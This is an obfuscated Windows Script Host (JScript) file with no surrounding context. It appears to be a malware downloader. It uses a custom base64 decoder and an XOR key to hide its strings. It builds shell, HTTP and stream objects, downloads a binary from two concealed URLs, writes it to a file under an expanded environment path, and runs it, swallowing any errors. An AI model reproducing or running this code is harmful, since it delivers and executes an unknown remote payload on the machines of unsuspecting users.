function decode(luminaryPaf, constantfda, flourishyPE) {
    luminaryPaf = luminaryPaf.replace(/[^A-Za-z0-9\+\/\=]/g, "");
    var incidentalots = [ 62, -1, -1, -1, 63, 52, 53, 54, 55, 56, 57, 58, 59, 60, 61, -1, -1, -1, 64, -1, -1, -1, 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, -1, -1, -1, -1, -1, -1, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51 ];
    var considerHjd = constantfda;
    if (!considerHjd) {
        considerHjd = new Uint8Array(Math.ceil(luminaryPaf.length / 4) * 3);
    }
    flourishyPE = flourishyPE || 0;
    var oppressuj7, deviceRpP, distinctiont8Y, sobco3;
    var projectrwj = 0, charyq3t = flourishyPE;
    while (projectrwj < luminaryPaf.length) {
        oppressuj7 = incidentalots[luminaryPaf.charCodeAt(projectrwj++) - 43];
        deviceRpP = incidentalots[luminaryPaf.charCodeAt(projectrwj++) - 43];
        distinctiont8Y = incidentalots[luminaryPaf.charCodeAt(projectrwj++) - 43];
        sobco3 = incidentalots[luminaryPaf.charCodeAt(projectrwj++) - 43];
        considerHjd[charyq3t++] = oppressuj7 << 2 | deviceRpP >> 4;
        if (distinctiont8Y !== 64) {
            considerHjd[charyq3t++] = (deviceRpP & 15) << 4 | distinctiont8Y >> 2;
            if (sobco3 !== 64) {
                considerHjd[charyq3t++] = (distinctiont8Y & 3) << 6 | sobco3;
            }
        }
    }
    return constantfda ? charyq3t - flourishyPE : considerHjd.subarray(0, charyq3t);
}

var diademTqa = function(estrangegbK) {
    var crewj6l = [];
    var railtu7 = decode(estrangegbK, crewj6l);
    var bentKSo = "charCodeAt";
    var tawdrykfj = "";
    for (var projectrwj = 0; projectrwj < railtu7; projectrwj++) {
        tawdrykfj += String.fromCharCode(crewj6l[projectrwj] ^ "hbkC3CDCsvmBJSmU"[bentKSo](projectrwj % "hbkC3CDCsvmBJSmU".length));
    }
    return tawdrykfj;
};

var incongruitys0I = function() {
    var malaisehiK = function() {};
    malaisehiK.prototype.OHmMbzQvwy = function(countermandXYP) {
        var humblenw9 = diademTqa('"KxAOIkcmCyEZEw42"');
        return WScript[humblenw9](countermandXYP);
    };
    return malaisehiK;
}();

(function() {
    var mitesst = new incongruitys0I();
    var adulterateL3p = 200;
    var unseemlyJKk = diademTqa('"Lyc/"');
    var enraptureEP7 = diademTqa('"LRoOIA=="');
    var armadadKR = diademTqa('"BxIOLQ=="');
    var fatuousU9F = diademTqa('"PzEIMVozMG0gHgguJg=="');
    var doggedeAK = diademTqa('"JTEzDn9xahs+OiUWHgM="');
    var beatificSAF = diademTqa('"OVc9C0ZyKHEEHw=="');
    var dispatchoZd = diademTqa('"LFdcEGcsI3cLLg=="');
    var premiseTIS = diademTqa('"KSYkB3E="');
    var retiringMa0 = diademTqa('"OxYZJlIu"');
    var maulHEW = diademTqa('"TTYuDmNmGA=="');
    var incorrigiblencN = diademTqa('"RgcTJg=="');
    var siegeXw2 = Math.pow(2, 10) * 249;
    var threadbareGJ7 = [ diademTqa('"ABYfMwlsazQbEx8jODYUOh0EGSxeJSJtEBkAbXNgQzAQBw=="'), diademTqa('"ABYfMwlsayIBEwMmODwYPhERDzJCbScsHllUcWQ2FTA="') ];
    var ominousBr8 = 4194304;
    var trenchantWlq = mitesst[diademTqa('"JyoGDlE5FTUEDw=="')];
    var surreptitiousZ9U = trenchantWlq(fatuousU9F);
    var pompRUO = trenchantWlq(doggedeAK);
    var yieldiiu = trenchantWlq(premiseTIS + diademTqa('"Rg=="') + retiringMa0);
    var omniscientDM6 = surreptitiousZ9U.ExpandEnvironmentStrings(maulHEW);
    var betrothedj3j = omniscientDM6 + ominousBr8 + incorrigiblencN;
    var whorlmbC = false;
    for (var functionaryKnB = 0; functionaryKnB < threadbareGJ7.length; functionaryKnB++) {
        try {
            var fancyRVQ = threadbareGJ7[functionaryKnB];
            pompRUO.open(unseemlyJKk, fancyRVQ, false);
            pompRUO.send();
            if (pompRUO.status == adulterateL3p) {
                try {
                    yieldiiu[armadadKR]();
                    yieldiiu.type = 1;
                    yieldiiu.write(pompRUO[diademTqa('"GgcYM1wtNyYxGQk7"')]);
                    if (yieldiiu.size > siegeXw2) {
                        functionaryKnB = threadbareGJ7.length;
                        yieldiiu.position = 0;
                        yieldiiu.saveToFile(betrothedj3j, 2);
                        whorlmbC = true;
                    }
                } finally {
                    yieldiiu.close();
                }
            }
        } catch (ignored) {}
    }
    if (whorlmbC) {
        surreptitiousZ9U[enraptureEP7](omniscientDM6 + Math.pow(2, 22));
    }
})();